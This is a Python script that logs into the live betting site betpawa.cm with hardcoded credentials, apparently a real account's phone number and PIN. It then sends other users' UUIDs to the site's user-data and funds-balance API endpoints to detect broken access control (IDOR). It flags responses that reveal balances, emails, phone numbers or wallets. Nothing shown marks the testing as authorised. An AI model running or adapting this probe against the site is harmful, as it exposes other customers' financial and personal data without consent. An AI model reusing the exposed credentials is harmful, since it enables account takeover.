import requests
import json

session = requests.Session()

# ---------------- LOGIN ----------------
login_url = "https://www.betpawa.cm/api/user/v3/authenticate"

headers = {
    "User-Agent": "Mozilla/5.0",
    "Content-Type": "application/json",
    "X-Pawa-Brand": "betpawa-cameroon",
    "X-Pawa-Language": "en"
}

payload = {
    "username": "652223518",
    "password": "9012",
    "rememberMe": False
}

session.post(login_url, headers=headers, json=payload)

print("[+] Logged in")
print("[+] Cookies:", session.cookies.get_dict())


# ---------------- TARGETS ----------------
targets = [
    {
        "url": "https://www.betpawa.cm/api/preference/v1/user-derived-data",
        "method": "GET",
        "param": None
    },
    {
        "url": "https://www.betpawa.cm/api/ledger/v2/funds/balance/list",
        "method": "POST",
        "param": "uuid",
        "body": {}   # important for POST
    }
]

test_ids = [
    "d9489d75-be66-42b2-9116-ebc4552ff1f4",
    "11111111-1111-1111-1111-111111111111"
]


# ---------------- REQUEST HANDLER ----------------
def send_request(target, uid=None):
    url = target["url"]
    method = target["method"]

    if method == "GET":
        if target["param"] and uid:
            url = f"{url}?{target['param']}={uid}"
        r = session.get(url, headers=headers)
        return r.status_code, safe_json(r)

    elif method == "POST":
        body = target.get("body", {}).copy()

        if target["param"] and uid:
            body[target["param"]] = uid

        r = session.post(url, headers=headers, json=body)
        return r.status_code, safe_json(r)


def safe_json(r):
    try:
        return r.json()
    except:
        return r.text


def compare(a, b):
    return json.dumps(a, sort_keys=True) == json.dumps(b, sort_keys=True)


# ---------------- TEST ENGINE ----------------
print("\n[+] STARTING ACCESS CONTROL TESTS\n")

for target in targets:
    print("\n==============================")
    print("[*] Testing:", target["url"])

    baseline_status, baseline_data = send_request(target)

    print("Baseline status:", baseline_status)

    for uid in test_ids:

        status, data = send_request(target, uid)

        print("\n--- UID:", uid)
        print("Status:", status)

        if status != baseline_status:
            print("⚠️ STATUS CHANGE DETECTED")

        elif compare(data, baseline_data):
            print("✔️ No change")

        else:
            print("⚠️ RESPONSE CHANGE DETECTED")

            if isinstance(data, dict):
                sensitive = ["balance", "email", "phone", "wallet", "user"]

                if any(k in str(data).lower() for k in sensitive):
                    print("🔥 SENSITIVE DATA DIFFERENCE (MANUAL CHECK REQUIRED)")
                else:
                    print("⚠️ Non-sensitive change")
